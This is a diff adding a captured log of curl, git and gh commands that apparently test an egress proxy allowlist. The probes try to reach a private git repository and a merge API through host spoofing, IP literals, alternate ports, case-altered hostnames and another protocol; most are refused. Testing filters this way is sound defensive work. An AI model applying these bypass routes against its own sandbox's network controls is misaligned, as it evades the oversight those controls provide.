+$ curl -sS -k -m 8 -o /tmp/b -w http=%{http_code} -x 127.0.0.1:3128 --connect-to ghes.example.test:443:other.example.test:443 'https://ghes.example.test/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=401
+### ip-literal-connect rc=56
+$ curl -sS -k -m 8 -o /tmp/b -w http=%{http_code} -x 127.0.0.1:3128 "https://$ORIGIN_IP/acme/secret.git/info/refs?service=git-upload-pack" 2>&1
+curl: (56) CONNECT tunnel failed, response 403
+http=000
+### connect-other-port rc=56
+$ curl -sS -k -m 8 -o /tmp/b -w http=%{http_code} -x 127.0.0.1:3128 'https://ghes.example.test:8443/acme/secret.git/info/refs?service=git-upload-pack' 2>&1
+curl: (56) CONNECT tunnel failed, response 403
+http=000
+### connect-case rc=0
+$ curl -sS -m 8 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x 127.0.0.1:3128 'https://GHES.EXAMPLE.TEST/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b
+http=403{"message":"refused by the egress operation allowlist: smart HTTP on a VCS host goes through the local git end
+### git-protocol-scheme rc=128
+$ timeout 8 git ls-remote git://ghes.example.test/acme/secret.git 2>&1
+fatal: unable to look up ghes.example.test (port 9418) (Try again)
+### gh-api-still-filtered rc=1
+$ env GH_HOST=ghes.example.test GH_ENTERPRISE_TOKEN=lenny-injected gh api -X PUT repos/acme/widgets/pulls/7/merge 2>&1
+{"message":"refused by the egress operation allowlist: PUT /api/v3/repos/acme/widgets/pulls/7/merge is not on the allowlist"}gh: refused by the egress operation allowlist: PUT /api/v3/repos/acme/widgets/pulls/7/merge is not on the allowlist (HTTP 403)
+script-rc=0
